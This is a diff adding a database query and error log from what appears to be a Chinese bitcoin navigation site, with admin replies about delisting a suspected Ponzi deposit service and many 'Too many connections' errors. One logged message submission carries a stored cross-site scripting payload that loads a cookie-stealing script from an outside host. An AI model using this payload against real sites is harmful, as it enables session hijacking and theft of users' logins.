@@ -1,0 +1,104 @@
+
+Addr:180.175.21.115;
+Data:2012-09-07 18:13:22;
+Page:/evaqinadmin/adminMessage.php;
+Info:;
+Query:UPDATE 5w_message SET reply='非常感谢你能够指正我的错误! 我已经在投资的页面删掉了这个网址.
+这确实是我的失误, 当初我看到这个网站在做广告, 点进去之后简单的看了一下他的业务(目前他的这个网站已经不在提供这个服务了), 我记得是可以存bitcoin给他们, 然后他们提供高额的利息, 说实话, 当时我确实没有去仔细查证这是否是一个庞氏骗局. 如果我没有记错, 他们提供的存款利率确实挺高(好像某个利率是接近10%的).
+再次感谢你的指正! 你不但在我网页上留言, 还给我发了邮件, 我本应该更及时的处理掉这个事情. 今后我会更频繁的浏览我的邮件!
+欢迎能够继续关注我的网站, 并提出你的宝贵建议和意见.
+我的邮箱: webmaster@btc123.com
+再次表示感谢!' WHERE mid=4;
+
+Addr:180.175.21.115;
+Data:2012-09-07 18:16:06;
+Page:/evaqinadmin/adminMessage.php;
+Info:;
+Query:UPDATE 5w_message SET reply='非常感谢你能够指正我的错误! 我已经在投资的页面删掉了这个网址.
+这确实是我的失误, 当初我看到这个网站在做广告, 点进去之后简单的看了一下他的业务(目前他的这个网站已经不在提供这个服务了), 我记得是可以存bitcoin给他们, 然后他们提供高额的利息, 我觉得这是一个不错的应用, 但当时我确实没有去仔细查证这是否是一个庞氏骗局. 
+再次感谢你的指正! 你不但在我网页上留言, 还给我发了邮件, 我本应该更及时的处理掉这个事情. 今后我会更频繁的浏览我的邮件!
+欢迎能够继续关注我的网站, 并提出你的宝贵建议和意见. 
+webmaster@btc123.com' WHERE mid=4;
+
+Addr:14.106.113.148;
+Data:2012-11-30 20:12:46;
+Page:/message.php;
+Info:;
+Query:INSERT INTO 5w_message (mid, type, title, content, contact, createDate, urlfrom) VALUES (null, '1', '&lt;script src=http://www.91taobaobei.com/mycookies/getcookies.js&gt;&lt;/script&gt;', '&lt;script src=http://www.91taobaobei.com/mycookies/getcookies.js&gt;&lt;/script&gt;', '&lt;script src=http://www.91taobaobei.com/mycookies/getcookies.js&gt;&lt;/script&gt;', '1354277565', '');
+
+Addr:116.238.3.62;
+Data:2013-06-24 10:54:47;
+Page:/i/index.php;
+Info:;
+Query:insert into 5w_tag_site_nav(`userID`,`navName`,`navSort`,`navImg`) SELECT 3,`stpName`,1,`stpImg` FROM `defaultsitetype` where `stpID`= 1;
+
+Addr:61.160.224.140;
+Data:2014-12-27 02:12:29;
+Page:/message.php;
+Info:Got error 28 from storage engine;
+Query:SELECT distinct mid, 5w_message.type, 5w_message.title, content, contact, createDate, reply, urlfrom, stpName FROM 5w_message LEFT JOIN 5w_type_site ON (5w_message.urlfrom=5w_type_site.stpHtmlName AND 5w_type_site.stpHtmlName!='') WHERE reply is not null  ORDER BY mid DESC;
+
+Addr:61.160.224.139;
+Data:2014-12-27 03:04:03;
+Page:/message.php;
+Info:Too many connections;
+Query:;
+
+Addr:61.160.224.140;
+Data:2014-12-27 03:12:28;
+Page:/message.php;
+Info:Too many connections;
+Query:;
+
+Addr:61.160.224.140;
+Data:2014-12-27 03:16:33;
+Page:/message.php;
+Info:Too many connections;
+Query:;
+
+Addr:61.160.224.141;
+Data:2014-12-27 03:19:20;
+Page:/message.php;
+Info:Too many connections;
+Query:;
+
+Addr:61.160.224.141;
+Data:2014-12-27 03:44:07;
+Page:/message.php;
+Info:Too many connections;
+Query:;
+
+Addr:125.88.189.16;
+Data:2014-12-27 03:55:43;
+Page:/message.php;
+Info:Too many connections;
+Query:;
+
+Addr:61.160.224.140;
+Data:2014-12-27 03:56:33;
+Page:/message.php;
+Info:Too many connections;
+Query:;
+
+Addr:61.160.224.135;
+Data:2014-12-27 04:24:22;
+Page:/message.php;
+Info:Too many connections;
+Query:;
+
+Addr:61.160.224.140;
+Data:2014-12-27 04:31:33;
+Page:/message.php;
+Info:Too many connections;
+Query:;
+
+Addr:61.160.224.139;
+Data:2014-12-27 04:55:57;
+Page:/message.php;
+Info:Too many connections;
+Query:;
+
+Addr:61.160.224.139;
+Data:2014-12-27 04:56:01;
+Page:/message.php;
+Info:Too many conn
